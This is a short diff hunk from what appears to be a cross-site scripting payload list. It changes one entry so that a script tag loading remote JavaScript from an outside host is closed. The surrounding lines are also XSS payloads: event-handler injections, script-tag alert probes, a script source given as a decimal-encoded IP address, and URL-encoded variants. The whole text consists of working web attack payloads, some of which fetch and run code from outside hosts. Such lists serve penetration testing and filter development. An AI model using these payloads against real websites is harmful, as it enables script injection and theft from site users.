@@ -26,7 +26,7 @@
 <x contenteditable onpaste=alert(1)>paste here!
 <script>alert(1)//
 <script>alert(1)<!–
-<script src=//brutelogic.com.br/1.js>
+<script src=//brutelogic.com.br/1.js></script>
 <script src=//3334957647/1>
 %3Cx onxxx=alert(1)
 <%78 onxxx=1
